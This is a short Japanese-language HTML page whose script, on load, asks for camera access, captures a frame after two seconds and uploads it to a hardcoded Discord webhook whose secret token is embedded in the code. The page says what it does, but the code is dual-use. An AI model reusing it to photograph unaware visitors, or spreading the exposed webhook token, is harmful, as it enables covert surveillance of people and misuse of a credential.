<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>カメラ画像送信</title>
</head>
<body>
  <h2>カメラ画像をDiscordに送信中...</h2>
  <video id="video" autoplay playsinline style="display:none;"></video>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1385866937858261024/gvN6oN3hYUD-_bHf-kSa-HN99E6BD3lcn-UZ8l51xwJA8HDIPw6D03ptIfRe-uzaQyOH";

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;

        // 映像が読み込まれたら画像をキャプチャして送信
        video.onloadedmetadata = () => {
          setTimeout(() => {
            sendImage(video);
          }, 2000); // 2秒後に送信
        };
      } catch (err) {
        alert("カメラにアクセスできませんでした。");
        console.error(err);
      }
    }

    async function sendImage(video) {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const imageBlob = await new Promise(resolve =>
        canvas.toBlob(resolve, 'image/jpeg')
      );

      const formData = new FormData();
      formData.append('file', imageBlob, 'camera.jpg');

      fetch(webhookURL, {
        method: 'POST',
        body: formData
      }).then(() => {
        alert("画像をDiscordに送信しました！");
      }).catch(err => {
        alert("送信に失敗しました。");
        console.error(err);
      });
    }

    window.onload = startCamera;
  </script>
</body>
</html>
